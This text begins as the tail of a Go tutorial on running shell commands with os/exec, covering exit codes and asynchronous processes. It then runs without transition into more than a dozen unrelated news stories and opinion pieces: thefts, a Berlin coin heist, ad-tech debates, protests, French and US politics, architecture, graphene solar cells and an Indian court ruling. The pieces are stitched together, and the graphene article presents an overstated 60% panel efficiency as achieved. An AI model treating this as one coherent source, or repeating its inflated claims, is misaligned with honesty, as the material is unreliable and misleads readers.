In the above example we manually connect our own buffer to capture the commands stdout stream. We can do the same for stderr and even stdin so long as it adheres to the io.Reader interface.
So far we've seen how easy it is to capture command output across multiple file descriptors. It's more verbose then other languages but it gives us lots of flexibility.
Exit codes
Retrieving the exit code of a command is easy with Go. You may have already noticed in the previous examples that when executing the command Go can return an error. These errors occur if there is an issue with IO or of the command doesn't return a successful exit code (0).
The following code will output the exit code of a command.
cmd := exec.Command("ls", "/imaginary/directory") var waitStatus syscall.WaitStatus if err := cmd.Run(); err != nil { printError(err) // Did the command fail because of an unsuccessful exit code if exitError, ok := err.(*exec.ExitError); ok { waitStatus = exitError.Sys().(syscall.WaitStatus) printOutput([]byte(fmt.Sprintf("%d", waitStatus.ExitStatus()))) } } else { // Command was successful waitStatus = cmd.ProcessState.Sys().(syscall.WaitStatus) printOutput([]byte(fmt.Sprintf("%d", waitStatus.ExitStatus()))) } // http://play.golang.org/p/m2A17UWSOL
The above code looks more complicated but in traditional Go fashion it handles many situations.
Create an *exec.Cmd
Execute and test for any errors
If we received an error then check it was because of the commands exit
If no error then check the commands *os.ProcessState for the exit code (pretty much guaranteed to be 0 but in here for completion)
A caveat to take note of is that if Go failed to locate the command in your $PATH then it won't ever execute the command and thus you will have no exit code. This is why it is important to assert the type of error returned.
Long running processes
All our above examples are synchronous. They wait for the command to complete before continuing the execution of our application. If we wanted to execute a long running task however it is likely that we want it to happen asynchronously. Once again this is trivially easy.
cmd := exec.Command("cat", "/dev/random") randomBytes := &bytes.Buffer{} cmd.Stdout = randomBytes // Start command asynchronously err := cmd.Start() printError(err) // Create a ticker that outputs elapsed time ticker := time.NewTicker(time.Second) go func(ticker *time.Ticker) { now := time.Now() for _ = range ticker.C { printOutput( []byte(fmt.Sprintf("%s", time.Since(now))), ) } }(ticker) // Create a timer that will kill the process timer := time.NewTimer(time.Second * 4) go func(timer *time.Timer, ticker *time.Ticker, cmd *exec.Cmd) { for _ = range timer.C { err := cmd.Process.Signal(os.Kill) printError(err) ticker.Stop() } }(timer, ticker, cmd) // Only proceed once the process has finished cmd.Wait() printOutput( []byte(fmt.Sprintf("%d bytes generated!", len(randomBytes.Bytes()))), ) // http://play.golang.org/p/tQRk1xJOqW
Now that was a lot more work but it all makes good sense. I started a computationaly difficult task of generating a collection of random bytes. Next I start that command asynchronously and then begin a ticker to show the elapsed time and a timer to kill the process after 4 seconds. Once the process has been killed then we output the total number of generated bytes.
A small disclaimer. I don't claim that this is the best way to do this but it demonstrates asynchronous commands and the ability to send signals to the process within our application.
This has been quite a technical post but we have covered lots of ground with the flexibility of os/exec . I have tested all the examples on my Mac using go1.3. Any suggestions/improvements are welcomed.
I hope I've been able to get across why I'm beginning to really enjoy working with Go.

Police were searching Monday for three men wanted for stealing mail from an apartment building on Vermont Avenue and Beverly Boulevard in Los Angeles.
Surveillance video showed three men arriving at the Frostonya Apartments just before 5 a.m. Saturday.
The men could be seen riding bikes and appeared to enter the building using a postal carrier's master key, according to the Los Angeles Police Department.
The video showed one of the men entering the mail room and opening each of the multi-box units using what police believe was a post office universal key.
One suspect appeared to go to into the hallway to act as a lookout, police said. Another man stood watch at the front door.
The three men left with trash bags filled with stolen mail, according to police.

By KIRSTEN GRIESHABER, Associated Press
BERLIN (AP) — Hundreds of German special police raided several buildings in Berlin early Wednesday, arresting four suspects in connection with the brazen heist of a 100-kilogram (221-pound) Canadian gold coin stolen from one of the city's museums earlier this year.
Heavily-armed masked police arrested the suspects, one wearing a hood over his head, in Berlin's Neukoelln neighborhood. Another nine people are being questioned in the case. All suspects are related to one another and aged between 18 and 20, police said.
The raids of 13 different buildings lasted several hours, but the gold coin was not recovered.
"We assume that the coin was partially or completely sold," Carsten Pfohl of the Berlin state criminal office told reporters at a press conference. He added that police also confiscated clothes and cars to comb for traces of gold.
The Canadian "Big Maple Leaf" coin, worth several million euros (dollars), was stolen from the Bode museum in March.
Police say the three-centimeter (1.2-inch) thick gold coin, with a diameter of 53 centimeters (20.9 inches) has a face value of 1 million Canadian dollars ($750,000). By weight alone, however, it would be worth almost $4.5 million at market prices.
Experts think the coin may have been melted down already to cash in on the gold. Police also searched a jewelry store in the Berlin neighborhood, saying they had indications the store may have been involved in the possible sale of the gold.
The thieves were most likely tipped off to the existence of the enormous coin by an acquaintance who worked at the museum as a guard, police said.
At least two burglars broke into the museum at night on March 27, using a ladder to climb to a window from elevated railway tracks. They grabbed the coin, loaded it onto a wheelbarrow and then carted it out of the building and along the tracks across the Spree River before descending into a park on a rope and fleeing in a getaway car.
Police had published footage from surveillance video asking the public for help in finding the thieves.
The coin, which has an image of Queen Elizabeth II on one side and maple leaves on the other, was on loan from a private, unidentified person, dpa reported. It's one of only five that were made by the Royal Canadian Mint.
There is such a thing as too much of a good thing, particularly when it is removing competition and marking its own homework. Or that's what the industry seems to be feeling about the dominance of technology platforms come media owners Google and Facebook.
The UK's leading programmatic practitioners congregated this week in Shoreditch at The Drum's second annual Programmatic Punch to debate issues blighting the industry's path to using programmatic technology to the best of its ability.
One of the key themes, for both the brand and publisher ends alike, was the impact that an overly dominant Facebook and Google would have on the market – with certain estimates claiming they collectively account for over 75% of the digital advertising market.
The complaints come in different forms; the issue of walled gardens preventing advertisers from universally leveraging their audience data is still a huge concern for agencies and brands, as is the issue that some ad tech platforms will push out agencies by trying to go direct to clients.
For publishers the onus is to become less reliant on the duopoly when audiences are being traded, a retaliation to a bias that the industry believes takes place within the Google adtech stack DoubleClick.
Martin Kelly, Infectious Media, CEO, speaking at Programmatic Punch 2016
Another dynamic that surfaced during the day was solving the problem of adtech businesses going direct to clients. This is arguably a difficult one to solve as it's based on human behaviour, rather than one that can be solved with technology. As Infectious Media co-founder & CEO, Martin Kelly, said: “For agencies, it's frustrating when partners go in directly to a client, it's a sure fire way to piss them off, but it's difficult to argue with businesses like Google having a direct relationship with advertisers."
However, the issue that the likes of Google and Facebook are walled gardens is being addressed in significant ways by the industry. Holding both the inventory and data that agencies and advertisers need to gain access to consumers in closed environment is detrimental to the holy grail of a single customer view. It's something that WPP's GroupM is directly addressing in the launch of its new [m]Platform proposition.
Speaking to The Drum at the time of launch, global chief executive of [m]Platform Brian Gleason, said: "What we're trying to do is solve the problem of clients trying to build [universal campaign reporting]; it's still less than 10% of clients have a singular view of their customer, so that's a challenge. If you look at the marketplace, certain publishers have tremendous data sets on consumers – whether it be Google, or Apple - and fantastic relationships, and for us the challenge is how do we do that for our clients?"
During a panel on the changing shape of agencies, Infectious Media's Kelly, commented on the launch of [m]Platform: “The industry needs to start leveraging scale differently and leveraging media spend to build unique data assets is a really smart plan. Criteo is another one that has aggregated advertising to create a cross-device graph. The issue is around getting client contracts right and getting people to understand it conceptually.”
Jonathan Nash, fellow panelist and head of programmatic UK and international at Teads, said that while the move was positive for the industry, there was another issue as it was another closed solution. He added: “If advertisers understand it then it could be right thing to do but what if you want to move to different holding group, where does the data sit?”
Outside of the holding group world, another alternative has been the ad tech coalition DigiTrust, which is now looking to build publisher interest and support. It effectively wants to create a single customer view by creating a standardised ID but at this stage publisher adoption has been slow, but this looks set to change with publishers increasingly banding together, like in the setting up their own coalitions, such as the Pangaea alliance.
Commenting on this, Dan de Sybel, CTO at Infectious Media, said: “Publishers are learning to put their faith, and their futures, into broader industry alliances in order to help improve the overall health of the media and advertising ecosystem and take the fight to Google and Facebook. We can expect publisher commitment to DigiTrust to increase significantly over the next six months.”
Another tool in the publisher arsenal has been header bidding, the promise of which has been to fix issues with supposed biases existing within the ‘waterfall' tech stack (read 'DoubleClick) where Google's algorithms allegedly favours its own media and impressions.
(L-R) Nigel Gilbert, AppNexus VP; Amir Malik, programmatic director, Trinity Mirror; Andrew Buckman, OpenX, MD
Also speaking at Programmatic Punch, Amir Malik, programmatic director at Trinity Mirror (pictured above), who said the fact that Google was now responding to the technology, which means it [header bidding] was already having an impact.
He added: “Header bidding has been a fantastic development for us, it is largely an opportunity to stop the dominance of Google over ad inventory so we can resist Google taking the first look on every impression. Google rarely responds to initiatives in the adtech space, unless a billion of dollars are in it for them and they are responding to header bidding.”
Alongside him was AppNexus VP of strategic development in EMEA Nigel Gilbert and Andrew Buckman, managing director EMEA of OpenX (also pictured above). All three agreed that one retaliation from Google to header bidding was a common criticism around latency and a lack of standards; Buckman cited a US publisher that used 14 different header bidders that all worked differently.
This was a criticism levelled of header bidding earlier in the day by Elli Papadaki, global head of programmatic at the Financial Times (pictured below), during a solo interview session, where she explained her decision to opt against header bidding.
Elli Papadaki, FT, global programmatic director, speaking at Programatic Punch 2016
She explained that concerns over how the time it takes to process bids made through header tags may lead to latency over page load times. Decision makers at The FT where thus concerns how this may impact the premium nature of its offering (reflected in its premium subscription revenue).
Hence it has thus far decided to pass on the opportunities posed by header bidding. Papadaki further explained how The FT said it was favouring a more long-term view on revenue, rather than short-term improvements to advertising yield.
Click here for a more in-depth examination of what both Mailk and Papadaki had to say about header bidding on the day.
Google, which was invited to participate in the panel but declined the opportunity, has not yet revealed its response to header bidding but Gilbert said that ultimately all adtech on the sell-side had been a hack on the ad server, because it didn't do what the industry needed. He said changes would have to be made after header bidding “exposed motive behind DoubleClick for Publishers”.
Trinity Mirror's Malik, who previously worked at Google, said the response was likely to be artificial intelligence and was backed up by Google's heavy investment in that area.
“The data all exists that can show what is going on and what is missing. Why does The Guardian get only 30p for every £1? Who can lift the lid up? You can see this happening with Amazon Cloud. There is an opportunity in getting the data and putting night vision goggles on it. Google knows that this will happen, if it doesn't do it itself.”
This isn't an issue that only Google is looking at, however, as the other side to the industry duopoly Facebook is also said to be developing tech to counter this.

At least five people were stabbed at a protest in front of Sacramento's Capitol building in a fight that broke out between 25 permit-wielding protestors from the Traditionalist Worker Party and 150 counter-protesting anarchists, according to the Sacramento Police Department
The Traditionalist Working Party is a white supremacist organization and the anarchists self-described themselves as the “anti-fascist” resistance. Protestors on both sides of the fray were stabbed.
Sacramento Police Chief Sam Somers told the Sacramento Bee that “it's a highly volatile situation,” and “ regardless of the message it's the skinhead's first amendment right to free speech.”
Local ABC News reporter Frances Wang documented the clashes:

Here is a little more about what members of TWP believe, from their website:
European-Americans are the descendants of indigenous people of Europe. They are often identified on government forms as Caucasian or ‘white.' We believe that European-American identity is under constant attack by members of American institutions such as the state, education, culture and even churches.
Another guiding value of TWP's platform, according to their website, is “multiculturalism” in that they believe in “multiple cultures or ethnicities existing in a country, but separated in their own enclaves, to safeguard those differences.”
Counter-protestors were reportedly referring to police who arrived at the scene as “Nazi chauffeurs.”
The original Traditionalist Working Party protest planned for the day was canceled.
Gavin Friedman entered guilty plea to charges of threats against the president, sending mail concerning an explosive, and two counts of communication threats through mail. (SBG San Antonio)
A Kerr County man accused of threatening to kill President Barack Obama in 2016 has entered a guilty plea for 4 of the 7 charges against him.
Gavin Friedman entered guilty plea to charges of threats against the president, sending mail concerning an explosive, and two counts of communication threats through mail. According to the federal plea agreement, Gavin Friedman admits to writing a letter in January of 2016 that contained a threat to kill President Obama.
In the agreement, Friedman also admits to threatening by mail to blowup the FBI building in Houston and White House in Washington DC. Friedman also admits to writing letters threatening the US state's attorney for the western district of Texas.
Friedman will be sentenced for these federal charges on October 10th. He is also facing 6 charges out of Kerr County that include making threats to people or buildings.
Story highlights Grover Norquist's tax pledge calls for no more tax increases ever
Donna Brazile: It's seismic that some GOP leaders are willing to defy his pledge
She says Norquist's tax pledge has bound most elected Republicans to him for 25 years
Brazile: Norquist is the man most responsible for GOP gridlock in Washington
Who is Grover Norquist? He's a private citizen, a conservative lobbyist, the author of the Taxpayer's Protection Pledge and president of Americans for Tax Reform. His idea of tax reform is no more tax increases ever again. And no closed loopholes unless matched by cuts in government spending.
In the 113th Congress, the one just elected that will begin in January, 219 of 234 Republicans in the House signed his tax pledge ; in the Senate, nine of 41 Republican senators signed it. By contrast, before the 112th Congress, which is still in session, 248 representatives and 41 senators signed it . The drop in support has brought the pledge into the media limelight.
Norquist says the pledge was made to the American people. But Norquist is the sole enforcer of the pledge, which he keeps in a fireproof safe in his office. No one has dared to challenge his self-appointed role as enforcer on behalf of American voters. Until this past week.
Four Republican senators, among them South Carolina's Lindsey Graham, as well as Rep. Peter King of New York, said they would willingly ditch their pledge, in Lindsey's words, " for the good of the country ." In an equally significant move, Oklahoma Rep. Tom Cole of the Republican Whip team told House Speaker John Boehner that he thought the Republicans should join President Barack Obama and immediately pass a tax extension for 98% of Americans who earn under $250,000.
Donna Brazile
These declarations from Republican leaders are like political dynamite. And like well-placed dynamite, they might begin to break the logjam preventing effective leadership and legislation in Congress.
Norquist, of course, doesn't think so.
His tax pledge has bound most elected Republicans to him for 25 years. When King said that he felt his pledge was only for one Congress, Norquist compared the pledge to marriage vows , hinting King's wife should be worried. (I couldn't find "till death do us part" in the pledge. But then, I'm not a Republican).
King replied that Norquist was "being a lowlife," words that caused almost an audible gasp among Republicans. You see, Norquist's pledge isn't about money; it's about loyalty.
Next to Mitch McConnell's pledge to defeat Obama in 2012, Grover Norquist is the man most responsible for Republican lockstep voting and gridlock in Washington.

That top Republicans are willing to openly defy Norquist's pledge and that any are willing to buck McConnell and Boehner are seminal events in recent American history. It means some Republican office holders are actually listening to what the voters said in the 2012 elections: Help the middle class, work together, stop the finger-pointing.
But McConnell and his collaborators are proceeding as if the 2012 election never happened. He and other Republican "leaders" apparently intend to extend the Republican campaign, disregarding the election and the people's mandate. They intend to push the Republican agenda that voters overwhelmingly rejected at the voting booth and in post-election polls.
Boehner claims that Congress received its own mandate. But Republicans lost seats in the House and the Senate that they had expected to win. Besides, as Harry Truman used to say, "The president is the only elected official who represents all the people."
John Podesta, President Bill Clinton's chief of staff, in writing about the fiscal cliff , said, "Obama didn't win just because of demographics: He won on the economy. ... The electorate understood that a vote for Obama was a vote for policies that would help the middle class and the working poor." Furthermore, "the public has joined the majority of leading economists in recognizing that a strong middle class, not ever more generous benefits for the wealthy, as the true engine of economic growth."
The Peter Kings, Lindsey Grahams and Tom Coles of the Republican Party get it. There aren't enough cuts to offset $1 trillion in lost taxes from the excessive tax breaks the wealthy were given. The alternative is to harm our national security, weaken our defenses and cause some Americans to literally go without food. The Republican budget that passed the House, but not the Senate, before the election would cut food stamps as excess spending for unemployed parents.
Extending the lesser tax breaks for 98% of all Americans is, indeed, a first order of business. Or as Cole said, "It's the right thing to do."
There is money for these things. First, though, Republicans must break Norquist's insane hold on their party. More Republicans must put their country before someone else's agenda, and their Pledge of Allegiance before "The Pledge" to Norquist.
It's merely a handful right now, but it looks as if the 75% of voters who approved of Obama's economic approach in exit polls to help the middle class and working poor are getting a voice in Congress.

This is the excruciating moment a priceless clock falls from a museum wall and smashes into pieces after a curious visitor touches it and knocks it off its hook.
The CCTV footage was posted online by employees at the National Watch and Clock Museum, in Columbia, Pennsylvania, where the incident took place.
Written alongside the clip is the warning: 'This is why we beg and plead with our visitors to please refrain from touching objects in museums.'
The video shows a couple admiring a unique clock hanging up in one of the rooms of the horology museum
The man takes a photograph of the clock before walking towards it to get a closer look and touching it
The video shows a couple admiring the clocks in one of the rooms of the horology museum, which is recognised as the largest and most comprehensive in North America, according to its website.
The man takes a photograph of a rather unique clock - a sculptural piece made by artist James Borden - before walking towards it to get a closer look.
He immediately reaches out with his hand and pulls on the pendulum to make the clock rock from side to side.
Meanwhile his wife, who had also reached out to touch the clock when the couple first walked over to it, takes a step backwards to watch.
The man continues to pull on the pendulum and appears more than confident that it will stay attached to the wall.
Seconds later disaster strikes however as a small part of the clock comes lose and falls to the ground.

The momentum causes the entire clock to fall from its hook and tumble to the floor as the man tries in vain to stop its descent.
He manages to catch the main body of the clock but many of its smaller parts had already come lose and are seen bouncing off the floor.
Without skipping a beat the man then sets about trying to reattach it to the wall, as if he would be able to do so without drawing any attention to himself.
Meanwhile his wife sets about collecting the little bits of clock from the ground.
After a failed attempt the man realises that the clock is heavier and bigger than he thought and extremely awkward to hold.
He abandons his efforts and instead dumps the clock on the ground before quickly leaving the area with his wife as if nothing happened.

One of the major reasons that solar panels are facing such hurdles to replace conventional electricity sources is because they are very inefficient. The most efficient (and most expensive) panel is currently somewhere around 32 percent efficiency. However, scientists in Switzerland have figured out a way to utilize Graphene in solar panel design, raising its efficiency to an absolutely staggering 60% – a finally feasible amount.

Graphene based solar panels will have energy efficiency of 60 percent
The experiment was conducted by a team from École Polytechnique Fédérale de Lausanne (EPFL) and no I cannot pronounce that and they were able to convert a single photon into electorns, producing an electric current. They did this by placing a thin layer of Graphene into an ultra high vacuum chamber. Electrons were subtracted and added chemically before the process (graphene doping). Then, it was blasted with a super fast pulse of laser light which excited the electrons in Graphene and put the whole material into a higher energy state. Since electric conduction is relative the new state was higher than before, resulting in current, and once again as it reverted back to its old state. This phenomenon can then be conducted as an electric current and used for power, and it all happens in a matter of femtoseconds, so a few quadrillionths of a second.
“a kind of stop-motion movie of the conversion process”, says Dexter Johnson at IEEE Spectrum. “This indicates that a photovoltaic device using doped graphene could show significant efficiency in converting light to electricity,” one of the team, materials scientist Marco Grioni, said in a press release.
It is all the more exciting because Graphene is an insanely amazing conductor of heat and electricity but uptill now it wasnt very good at absorbing light. A very big problem currently with a graphene based solar panel design is the fact that the edges of the graphene sheet are highly reactive, so harvesting the current would prove to be much more of a challenge. Similarly in its natural state, Graphene doesn't really want to absorb sunlight, something they will have to figure out a way to solve. We know that Graphene is a very efficient photo voltaic material, the question is now how to make it react to light and harvest electricity without destroying its composition.

Image copyright AFP Image caption Nicolas Sarkozy has now lost his second bid for re-election as president
French ex-President Nicolas Sarkozy has been knocked out of the contest for a centre-right presidential candidate and signalled his withdrawal from politics.
Admitting defeat, Mr Sarkozy endorsed Francois Fillon, a free-market liberal who won Sunday's first round with 44% of the vote.
Alain Juppe, who like Mr Fillon is an ex-prime minister, finished second.
They will face each other in a run-off next Sunday. The winner will compete in next year's presidential election.
The winner of the Republican primary is likely to make the presidential run-off, where he or she will probably face far-right leader Marine Le Pen.
With the governing socialists unpopular and divided, it seems unlikely that any left-wing candidate will survive the first round in April.
Image copyright Reuters Image caption Mr Fillon ran on a centrist platform advocating market reforms
More than four million people turned out to vote in Sunday's primary, a far higher number than expected. Polls suggest that the centre-right candidate will win the second round in May.
In his concession speech, Mr Sarkozy, 61, said: "I have no bitterness, I have no sadness, and I wish the best for my country."
Announcing that he would step back from politics, he added he would now "embark on a life with more private passions and fewer public passions".
Mr Sarkozy retreated from public life after he lost the presidency in 2012 but staged a comeback in 2014 to lead a revamped centre right.
He told reporters he now supported Mr Fillon, 62, whose "political choices" he said were closer to his own than Mr Juppe's.
Mr Fillon served as Mr Sarkozy's prime minister during the latter's presidency between 2007 and 2012.
Challenging Le Pen - by Lucy Williamson, BBC Paris Correspondent
Since his return to politics two years ago, Mr Sarkozy has seen his dominance of the centre-right leach steadily to his rivals. He banked on a hard-right agenda, sailing close to the policies of far-right leader Marine Le Pen on issues like security, immigration and French identity.
Whether it is his policies that have apparently alienated France, his previous record as president, or the scandals that have dogged him since he left, Mr Sarkozy is out of next year's presidential race before it has truly begun.
With approval ratings for France's Socialist president at historic lows, this primary contest is seen by some as an unofficial first round in France's presidential election, as whoever wins the centre-right nomination is expected to battle far-right leader Marine Le Pen in the run-off for the Elysee Palace next year.
Mr Fillon, an anglophile whose wife is Welsh and who admires Margaret Thatcher, said the result showed a strong movement of hope was under way.
He had promised deep market reforms and was initially not seen as the top contender. However he has enjoyed a late surge in polls.
"Defeat must not humiliate anyone because we will need everyone," he said. "I spare a thought particularly for Nicolas Sarkozy, France's former president."
What does Fillon stand for?
Image copyright AFP Image caption The front-runner in the Republican race wants big cuts to the public sector
An end to the 35-hour working week in the private sector and a return to 39 hours for public sector workers
Lower taxes and cuts of €100bn in public spending over five years. Half a million civil service jobs would go
An independent fund would be set up to stimulate entrepreneurship and create 500,000 to one million jobs
The retirement age would rise to 65
Adoption by same-sex couples would be banned
A referendum would be held on a quota for immigrants
Francois Fillon's rival in the run-off was regarded as the frontrunner for most of the primary race.
A 71-year-old former prime minister with a technocratic image, Alain Juppe had campaigned as a moderate and a unifying figure in the aftermath of jihadist attacks.
"This first round was a surprise," he said after it became clear he had come only second. "Next Sunday, if you want it and if I want it, will bring another surprise."
Image copyright AFP Image caption Alain Juppe is a veteran politician who was seen as the frontrunner
He is embroiled in a high-profile scandal over the breach of campaign spending limits in the 2012 election.
In September a judge ruled that Mr Sarkozy should stand trial in the case.
Turnout in the primary first round was higher than anticipated, with almost four million people taking part.

Protests continued across Portland on Monday, but drew much smaller crowds than last week.A group of about 50 demonstrators gathered outside Portland City Hall Monday and called on the city to shield undocumented immigrants from deportation. They linked hands and chanted “the people united will never be divided.”Portland Mayor Ted Wheeler has already said he plans to make Portland a so-called sanctuary city that protects immigrants. President-elect Donald Trump has said such cities could lose federal funding.The protesters called for Wheeler and the City Council to pass a resolution directing the police not to cooperate with federal immigration and customs enforcement. They said they plan to push the issue in other Oregon cities like Beaverton and Salem.Across town, high school students gathered in Northeast Portland to protest president-elect Donald Trump. Students from Grant High School organized the rally. About 100 people gathered, smaller than a walk-out last week.Alexis Cannard, a senior at Roosevelt High School, urged her fellow students to make sure their voices are heard.“Many of us were unable to vote in this election. Yet, we are the ones who will be feeling the after effects for the year to come,” she said.
Cannard and other students said they are worried that a Trump administration will stoke racism and withdraw from efforts to combat climate change.

The vice president of the Portland teacher's union, Elizabeth Thiel, also spoke. She told the students she was proud of their activism, but also encouraged them to build relationships with people who don't share their beliefs.
“We need to organize, and organizing is about bringing people in, especially people who aren't easy to bring in to your cause,” she said.
Portland Police officers on motorcycles helped to block traffic so the students could safely march through the streets. They crossed the Burnside Bridge, chanting “We reject the president elect.”

Later in the evening, police arrested three adult activists with the group Portland's Resistance, who had helped organize the rally. Police identified those people late Monday night as Gregory McKelvey, 23; Katheryn Stevens, 24; and Micah Rhodes, 23. All three are organizers for the group.“During the march, police officers observed McKelvey and Rhodes actively encouraging and directing student protesters to counter lawful police orders which were being broadcast over a loudspeaker by police,” police Sgt. Pete Simpson wrote in a press release.
Simpson said Stevens was arrested when she tried to stop McKelvey's arrest.
All three were booked into Multnomah County Jail on a charge of second-degree disorderly conduct. Rhodes and Stevens were also charged with interfering with a police officer.
Law enforcement temporarily dropped the charges against the activists at a court hearing Tuesday.
“I will plead not guilty and fight every single charge, even if reduced to a violation, in the courts,” Gregory McKelvey said in a press release. McKelvey maintains he was personally singled out for arrest by Mayor Charlie Hales.
Hales was organizing his own “March of Hope” Tuesday afternoon, which he has called “a stand against hate.”
But the mayor cancelled the march after Portland's Resistance said it intended to hold a rally at the same time and place.
Hale has advocated for refugees and immigrants in the past. He supported a local labor activist and undocumented migrant who, facing deportation, took refuge in a church and denounced then candidate Donald Trump's suggestion of a total ban on Muslims entering the United States.
But Hales has also questioned the efficacy of the protests that took place following the election, and some of his critics denounced the march as “hypocrisy.”

Rotterdam's new €175m market hall comes complete with apartments looping over it – some peeping out of giant avocado stones. It's proudly pop, but is it just the Comic Sans of architecture?
A four-storey high raspberry tumbles past a tree-sized floret of broccoli, while gigantic prawns plummet towards a pile of mega-mange tout. In Rotterdam's new market hall, you'd be forgiven for thinking you'd slipped down a rabbit hole into Wonderland, where a panorama of supersized fruit and veg rains down across the ceiling. It's a Sistine chapel of fresh produce.
As if this wasn't trippy enough, you then notice bedroom windows peeping out from a lemon, and someone doing the washing up inside the stone of an avocado. It turns out the majestic vaulted ceiling of this new temple to food is also inhabited – it's an apartment block of 230 flats, bent double over the food hall in hallucinogenic wonder.

This €175m conjuring trick is the work of MVRDV, leaders of the wave of “Superdutch” architects that emerged in the Netherlands in the 1990s, spawned from Rem Koolhaas's Office of Metropolitan Architecture. Driven by poppy polemic, their projects are characterised by improbable structural feats, executed with cartoonish glee. These are “look, no hands!” buildings, where slabs appear to float and towers teeter on the brink of toppling; architectural circus acts that are often dressed up in accordingly garish garb.
Their unlikely structures – which now dot the globe from Oslo to Tokyo – are often initiated by equally fantastical questions: What if pig farms were housed in high-rise towers? What if a comic museum was shaped like a cluster of enormous concrete speech bubbles? At their worst, the answers to these daydreams prioritise wit and wow factor over functional reality; at their best, the jaw-drop is so powerful that all else can be forgiven. So does their latest project manage to tread this fine line?
Galumphing into the middle of the city's sprawling Blaak market square, the great behemoth of the Markthal is certainly hard to miss. It squats like a chubby elephantine creature, lined with windows and balconies along its 120 metre-long flanks, terminating in a gaping portal towards the square like Milan's galleria, opening up to suck you into its psychedelic tunnel.

But rather than trumpeting the heroic form of a triumphal archway, its proportions seem squashed and deflated, presenting a facade that is almost wilfully clumsy. It's like a once-elegant arcade that has been deformed by the practical needs of incorporating straight, vertical lift shafts, naturally lit apartments and larger floor areas for shops in the lower levels, causing the silhouette to flare out at the base, as though it's wearing bell-bottom trousers. Like the podgy ligatures of the Comic Sans typeface, it feels like it's trying a bit too hard to be fun.
“We're not trying to be glassy and stylie, like your Foster and Rogers,” says Winy Maas, the energetic principal of MVRDV. “Rotterdam has a big working class population, so the building needs to be pop. We didn't want that contemporary poshness, or for it to feel like Harrods food court.” The grey cladding, he says, is the same Chinese granite that Rotterdam is paved with, “to extend the street up over the building,” while the outlandish form is designed to join in with the surrounding “mish mash” of novelty shapes that have congregated in this part of the city.
Flattened during the second world war, Rotterdam has served as a fertile architectural playground for the last 50 years, partly egged on by Hans Mentink, the politician in charge of planning in the 1970s, who called for “architecture with some life in it”. Across the market square stands the startling sight of Piet Blom's 1970s Kubuswoningen, a forest of tilted yellow cubes hoisted aloft on pillars above the busy main road, forming a bizarre treehouse village – the pinnacle of his manifesto for “living as an urban roof”. Next door stands his hexagonal tower block in the shape of a sharpened pencil, while further along is the central library, a stepped ziggurat sprouting a tangle of bright yellow pipes, like a mini Pompidou Centre.

“It's all so cute,” coos Maas, looking down from the window of one of the new Markthal apartments, which enjoy a view of this strange architectural menagerie. “We thought this collection had a sentimental beauty that could be monumentalised in our building” – indeed the elfin whimsy of the pencil tower is nicely framed by the market's archway. “It's a continuation, in the best Rotterdam tradition.”
The other side of the apartments look down into the food hall below, an arrangement originally intended to allow residents to haul up their shopping in a basket, but environmental regulations mean the windows are sadly now fixed shut. The odd form has also led to some awkward interiors; the 14 metre-deep flats feel a bit gloomy, with angled walls and windows recalling Blom's cube houses.
The €1.2m upper level penthouses, meanwhile, have open courtyard terraces with vertiginous views down through windows in the floor. “It will be interesting to see how you feel when your child is playing Lego above a 40-metre drop,” beams Maas, a maniacal glint in his eye.
The traders down below couldn't be happier with their new home, although those running stalls in the heaving market outside have mixed feelings about their new neighbour. The original plan was for the Markthal to be made up of a third trader from the market, a third new stall, and a third brand-name shops, but only a few existing traders have taken up the offer of going indoors, given the hike in rent. While Blaak accommodates a broad church, from fine fishmongers to bric-a-brac junk, the Markthal is strictly a foodie utopia of artisan bakers and biological butchers, aimed at a more upmarket clientele. As one shopper puts it candidly: “It's a great place. You can wander around inside and get inspired by the amazing displays, then go outside and buy the same stuff for a quarter of the price.”

The building's ethos is one of celebrating local, organic produce, with a centre to promote healthy cooking, and there plans for mini urban farms on the market stall rooftops – although that hasn't prevented the commercial imperative of including a gigantic chain supermarket in the basement below. And, like many of Rotterdam's recent inner-city developments, despite it being a beacon of downtown urban life, it has a strangely suburban approach to planning: deep within its bowels is the city's biggest car park, with 1,200 spaces, despite the metro and bus station being right opposite.
Back in the food hall, technicians are busy preparing the nightly son et lumiere show, projected onto the ceiling, described by its artists, Arno Coenen and Iris Roskam, as “the Big Bang of fruit,” in which produce showers down from the sun. It is a suitable climax for this most surreal of spaces which is, after all, the star of the show. It is an urban interior conceived on a heroic Roman scale, which almost forgives the external clumsiness – and another large apartment block will soon rise next door, helping to screen its immense bulk. “I'm secretly hoping that houses will grow up all around it, like a medieval cathedral,” says Maas. “That would be the dream.”

A business owner in Kansas was killed in an attempted robbery at his gun store, but the shop's two owners also shot and injured three of the four suspects, police said.
The violence in Shawnee, Kansas, southwest of Kansas City, broke out just after 2 p.m. local time when four men tried to rob She's a Pistol, a gun store and shooting range that offers self-defense courses geared toward women, according to a statement from the Shawnee Police Department. The store's owner, John Bieker, 44, was shot and later died, the statement said. His wife, Rebecca Bieker, suffered minor injuries, according to police.
The owners had fired on the suspects, but two of them fled on foot. Three of the suspects were shot, including two who were in critical condition. Police are unsure who fired first. Police found two suspects suffering from gunshot wounds in the store and caught the remaining two suspects, one of whom had also been shot, at a nearby home. All four suspects are in custody, said Shawnee Police Department Major Dan Tennis.
Shawnee Mayor Jeff Meyers said the city was suffering from “great sadness.” “John and Becky are respected business owners in our community who do things the right way and are always willing to go out of their way to help others,” Meyers said in a statement.
Image copyright AFP Image caption There has been a vocal campaign to decriminalise homosexuality in India
India's Supreme Court has agreed to revisit a previous judgement that upheld a law criminalising gay sex.
Three senior judges said the 2013 ruling would be re-examined by a larger bench of judges, in a move that has been welcomed by activists.
The judges said that the issue was a "matter of constitutional importance".
According to Section 377 of the Indian Penal Code (IPC), a 155-year-old colonial-era law, a same-sex relationship is an "unnatural offence".
In deeply conservative India, homosexuality is a taboo and many people still regard same-sex relationships as illegitimate.
There has been a very vocal campaign to decriminalise homosexuality in India.
On Tuesday, the court heard a "curative petition" - meant to "cure" an earlier court order perceived as a "miscarriage of justice".
The court said the five-judge bench would be headed by the chief justice of India.
No date has been announced for the next hearing into the matter.
Members of the LGBT community, standing outside the court, broke into cheers and impromptu celebrations when the decision was announced, the BBC's Soutik Biswas said.
Activists say police and authorities often misuse the law to harass homosexuals. Under this law, a same-sex relationship is punishable by a 10-year jail term.
In its 2009 ruling, the Delhi High Court had described Section 377 as discriminatory and said gay sex between consenting adults should not be treated as a crime.
The ruling was widely and visibly welcomed by India's gay community, which said the judgement would help protect them from harassment and persecution.
However, several political, social and religious groups petitioned the Supreme Court to have the law reinstated, and in 2013 the top court upheld the law, saying it was up to parliament to legislate on Section 377.
